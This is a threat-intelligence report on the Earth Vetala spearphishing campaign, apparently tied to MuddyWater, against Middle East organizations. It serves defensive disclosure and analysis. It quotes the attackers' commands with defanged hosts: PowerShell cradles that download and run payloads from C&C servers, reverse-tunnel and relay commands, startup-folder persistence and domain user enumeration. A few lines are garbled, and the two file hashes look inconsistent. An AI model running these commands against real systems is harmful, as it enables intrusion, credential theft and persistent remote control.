This campaign targets various organizations in the\nMiddle East and neighboring regions.\n\nBy: Adi Peretz, Erick Thek March 05, 2021 Read time: ( words)\n\nTrend Micro researchers recently detected activity targeting various organizations in the Middle East and neighboring regions. We were tipped\noff to this activity in part by research from [Anomali, which also identified a campaign targeting similar victims. We believe (with moderate](https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies)\n[confidence) that this newly identified activity is connected to MuddyWater (also known as TEMP.Zagros, Static Kitten, Seedworm).](https://www.trendmicro.com/en_us/research/18/c/campaign-possibly-connected-muddywater-surfaces-middle-east-central-asia.html)\n\nAdditionally, we were able to link the Anomali-identified activity to an ongoing campaign in 2021. This campaign uses the following legitimate\nremote admin tools such as:\n\n[ScreenConnect](https://www.connectwise.com/company/announcements/screenconnect-now-connectwise-control)\n[RemoteUtilities](https://www.remoteutilities.com/)\n\nWe have named this intrusion set Earth Vetala. Earth Vetala used spearphishing emails with embedded links to a legitimate file-sharing service\nto distribute their malicious package. The links were embedded within lure documents as well as emails.\n\nOnce a victim was accessed, attackers would determine if the user account was an administrator or normal user. They would then download\npost-exploitation tools that included password/process-dumping utilities, reverse-tunneling tools, and custom backdoors. The threat actors\nwould then initiate communications with additional command-and-control (C&C) infrastructure to execute obfuscated PowerShell scripts.\n\n**Overview**\n\nAnalysis indicates the Earth Vetala campaign is ongoing and that this threat actor has interests which appear to align with Iran.\n\nEarth Vetala historically targets countries in the Middle East. In this campaign, Earth Vetala threat actors used spearphishing emails and lure\ndocuments against organizations within the United Arab Emirates, Saudi Arabia, Israel, and Azerbaijan. The phishing emails and lure\ndocuments contain embedded URLs linking to a legitimate file-sharing service to distribute archives containing the ScreenConnect remote\nadministrator tool. ScreenConnect is a legitimate application that allows systems administrators to manage their enterprise systems remotely.\n\nOur research found threat indicators that were connected to the same campaign identified by Anomali. Analysis indicates that Earth Vetala is\nstill ongoing as of the publishing of this post. During this campaign, threat actors used post-exploitation tools to dump passwords, tunnel their\nC&C communication using open-source tools, and use additional C&C infrastructure to establish a persistent presence within targeted hosts\nand environments.\n\n**Technical Analysis**\n\nDuring our research, we observed a spearphishing email allegedly from a government agency.\n\n\n-----\n\nFigure 1. Phishing Email with the embedded URL\nThe email attempts to convince recipients to click the URL and download a malicious file. We have seen that one of two files may be\ndownloaded, one being a .PDF file and the other an .RTF file.\n\nAs with the spearphishing email, the lure documents' content attempts to convince the victim to click on another malicious URL and download\na .ZIP file.\n\n[The .ZIP file contains a copy of a legitimate remote administration software developed by RemoteUtilities and provides remote administration](https://www.remoteutilities.com/)\ncapabilities, including:\n\nDownloading and uploading files\nGrabbing screenshots\nBrowsing files and directories\nExecuting and terminating processes\n\nDuring our research, we were able to discover multiple .ZIP files used to distribute the RemoteUtilities remote administration software in the\nmanner above, with all of these distributing the same RemoteUtilities sample. The use of this tool differentiates this particular campaign from\nearlier research, as in previous attacks ScreenConnect was used. Otherwise, the TTPs in use remain broadly similar.\n\n**RemoteUtilities Analysis**\n\nWhen the RemoteUtilities software is executed, its process launches msiexec.exe with the following command:\n\nFigure\n\n4. RemoteUtilities Installation\nThe MSI installer installs a service on the victim machine called Remote Utilities – Host:\n\n\n-----\n\nFigure 5. Remote Utilities Service\n\nThe service then communicates with the domain id.remoteutilities.com, which belongs to RemoteUtilities. This connection is related to one of\nits features called Internet-ID Connection. This feature allows an intermediary Internet server to broker the connection, similar to a proxy\nserver. This allows the threat actor to connect to the Internet-ID server, which then connects to the actual RemoteUtilities host.\n\nFigure 6. id-server connection\n\n**Post-Exploitation Analysis**\n\nDuring our research, we discovered a compromised host in Saudi Arabia that used ScreenConnect remote administration software. They were\ntargeted via a malicious .ZIP file (SHA256 hash: b2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf) that contained a\nScreenConnect executable (SHA256 hash: 2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf)\n\nAs noted above, the ScreenConnect executable connects to the Internet-ID server, which is located at instance-sy9at2_relay.screenconnect.com and resolves to 51.68.244.39._\n\nThe same domain was mentioned in the previous research. We then observed the threat actors interact with the compromised host using the\nScreenConnect software, executing the following commands.\n\ncmd.exe net user /domain\n\nThe command above allows the attacker to get all the users from the domain controller.\n\nThe next command executed is the following:\n\npowershell.exe -exec bypass -w 1 -file a.ps1\n\nThis is a command to execute a PowerShell script of some kind. However, we did not have access to the a.ps1 file. We are not sure what\nfunctionality is provided here.\n\nThe next command issued is the following:\n\n\n-----\n\npo e s e e e u ttp //8 36 [ ] 8 /S a pC se e e out e c \\p og a data\\S a pC se e e usebas cpa s g\n\nThe command is connected to 187.236.212[.]184 and downloads a file called SharpChisel.exe (SHA256:\n61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2) and saves the file to the C:\\programdata directory. The name\n_SharpChisel may be related to the purpose of this file, which is a C# wrapper for a tunneling tool called chisel. The above IP address is_\ngeolocated to a server in Iran.\n\nThe following command then configures SharpChisel:\n\nC:\\programdata\\SharpChisel.exe client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999\n\nThis directs all traffic to the localhost at port 9999 to the same remote server.\n\nAnother instance of SharpChisel with different settings is executed, this time using PowerShell using the following command line:\n\npowershell.exe C:\\programdata\\SharpChisel.exe client 87.236.212[.]184:443 R:8888:127.0.0.1:9999\n\nThis time, traffic will be forwarded to the server over port 443.\n\nA third SharpChisel instance that connects to a different C&C server at 23.95.215.100:8080 is started via the following command:\n\nC:\\programdata\\SharpChisel.exe client 23.95.215[.]100:8080 r:8888:127.0.0.1:9999\n\nIt is then configured with the following command line PowerShell command:\n\npowershell.exe C:\\programdata\\SharpChisel.exe client 23.95.215[.]100:8080 R:8888:127.0.0.1:9999\n\nWe believe that the threat actor was unable to configure SharpChisel to work correctly. The use of the following command provides additional\nevidence to support our assumption:\n\npowershell.exe iwr -uri hxxp://87.236.212[.]184/procdump64.exe -outfile c:\\programdata\\procdump64.exe -usebasicparsing\n\nThe command connects to the C&C server, downloads procdump64.exe, and saves the file in the C:\\programdata directory. That supports our\nassumption that SharpChisel could not be configured correctly, and the attacker instead used PowerShell to download and run the legitimate\n_procdump64.exe utility._\n\nFigure 7. LIGOLO execution example\n\nThis was done using two separate commands:\n\nC:\\programdate\\1.exe -relayserver 87.236.212[.]184:5555\nC:\\users\\public\\new.exe -relayserver 87.236.212[.]184:5555\n\nWe then see the threat actor again attempting to use SharpChisel several times using the following command:\n\nC:\\programdata\\SharpChisel.exe client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999\npowershell.exe C:\\programdata\\SharpChisel.exe client 87.236.212[.]184:8080 R:8888:127.0.0.1:9999\n\nWe conclude that a tunneling connection to the C&C server could not be established, even after attempts to do so with two different tools.\n\nFollowing the unsuccessful attempt to configure a tunnel connection to their C&C server, the threat actors downloaded a remote access tool\n(RAT) and attempted to configure it. The following PowerShell command was used for this:\n\npowershell.exe iwr -uri hxxp://87.236.212[.]184/out1 -outfile c:\\users\\public\\out1.exe -usebasicparsing\n\nThe command downloads out1.exe and saves the file in the C:\\users\\public\\ directory. Using a UPX unpacker, we were able to extract the\n[contents, which consists of a Python executable. We then decompiled the python executable using pyinstxtractor.py to get all of the Python](https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py)\n[bytecode files. These are then decompiled to get the original python code using easypythondecompiler.](https://sourceforge.net/projects/easypythondecompiler/)\n\nThe out1.exe RAT has the following capabilities:\n\nData encoding\nEmail parsing\nFile and registry copy\nHTTP/S connection support\n\n\n-----\n\nat e co a d e\nProcess and file execution\n\nAfter this, the file C:\\users\\public\\Browser64.exe is run. Browser64 is a tool that extracts credentials from the following applications:\n\nChrome\nChromium\nFirefox\nOpera\nInternet Explorer\nOutlook\n\nUsage Example of Browser64.exe\nFollowing the use of browser64.exe, we observed the following command being executed:\n\n\nFigure 8.\n\n\npowershell.exe iex(new-object\nSystem.Net.WebClient).DownloadString('hxxp://23.94.50[.]197:444/index.jsp/deb2b1a127c472229babbb8dc2dca1c2/QPKb49mivezAdai1')\n\nThey again attempted to use SharpChisel with no success:\n\npowershell.exe C:\\programdata\\SharpChisel.exe client 23.95.215[.]100:443 R:8888:127.0.0.1:9999\nC:\\programdata\\SharpChisel.exe client 23.95.215[.]100:443 R:8888:127.0.0.1:9999\nC:\\programdata\\SharpChisel.exe server -p 9999 --socks5\n\nFinally, we observed a persistence mechanism being set using the following commands:\n\ncmd.exe /c Wscript.exe \"C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\news.js\"\n\ncmd.exe /c \"C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\newsblog.js\"\n\nWe were able to get a copy of newsblog.js, which is a simple VBS downloader that communicates with the following URL:\n\nhxxp://23[.]95[.]215[.]100:8008/index.jsp/7e95a3d753cc4a17793ef9513e030b49/4t2Fg7k6wWRnKgd9\n\n\n-----\n\nFigure 9. newsblog.js\nThe script sets up a new HTTP object and then tries to disable the system's local proxy settings. The script then executes an HTTP GET\nrequest to the C&C URL, grabs the server's response, and sleeps for 10 seconds.\n\nAt the time of our analysis, this server was still available. The response from the server contains an encoded PowerShell script, which is\nexecuted in memory. Decoding this script reveals that it contains a backdoor:\n\nFigure 10. deobfuscated PowerShell backdoor\nThe screenshot above shows an abbreviated view of the in-memory PowerShell backdoor. The PowerShell backdoor has the following\ncapabilities.\n\nCheck for Skype connectivity\nDownload and install Skype\nEncoded communication with its C2\nExecute commands sent from the C2 server\nGet multifactor authentication settings\nGet the currently logged on user and OS version\n\n**Earth Vetala Footprint**\n\nEarth Vetala conducted an extensive offensive campaign targeting multiple countries. We observed it operating in the following countries:\n\nAzerbaijan\nBahrain\nIsrael\nSaudi Arabia\nUnited Arab Emirates\n\n\n-----\n\nFigure 11. Affected countries\nWe observed Earth Vetala target the following sectors:\n\nGovernment Agencies\nAcademia\nTourism\n\n**Trend Micro Solutions**\n\nEarth Vetala represents an interesting threat. While it possesses remote access capabilities, the attackers seem to lack the expertise to use all\nof these tools correctly. This is unexpected since we believe this attack is connected to the MuddyWater threat actors — and in other\nconnected campaigns, the attackers have shown higher levels of technical skill.\n\nOur findings in this area were made possible by our Dedicated Intelligence Research (DIR) analysts. They are on-hand to help organizations\nreach important decisions and understand the nature of the security challenges they face.
